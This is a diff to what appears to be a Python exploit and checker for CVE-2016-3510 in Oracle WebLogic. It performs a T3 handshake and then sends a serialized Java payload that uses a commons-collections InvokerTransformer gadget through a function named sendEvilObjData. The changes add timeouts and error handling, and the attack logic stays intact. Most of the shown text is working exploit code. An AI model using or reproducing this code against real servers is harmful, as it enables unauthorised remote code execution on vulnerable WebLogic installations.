@@ -17,6 +17,7 @@ PAYLOAD=['aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d
 VER_SIG=['org.apache.commons.collections.functors.InvokerTransformer']
 def t3handshake(sock,server_addr):
     sock.connect(server_addr)
+    sock.settimeout(7)
     sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
     time.sleep(1)
     sock.recv(1024)
@@ -53,14 +54,17 @@ def checkVul(res,server_addr,index):
         # print '%s:%d is not vul %s' % (server_addr[0],server_addr[1],VUL[index])
         print(('[-]目标weblogic未检测到{}'.format(VUL[index])))
 def run(rip,rport,index):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
-    sock.settimeout(10)
-    server_addr = (rip, rport)
-    t3handshake(sock,server_addr)
-    buildT3RequestObject(sock,rport)
-    rs=sendEvilObjData(sock,PAYLOAD[index])
-    checkVul(rs,server_addr,index)
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
+        sock.settimeout(10)
+        server_addr = (rip, rport)
+        t3handshake(sock, server_addr)
+        buildT3RequestObject(sock, rport)
+        rs = sendEvilObjData(sock, PAYLOAD[index])
+        checkVul(rs, server_addr, index)
+    except Exception:
+        print("CVE_2016_3510脚本出错")
 
 if __name__=="__main__":
     rip = '127.0.0.1'
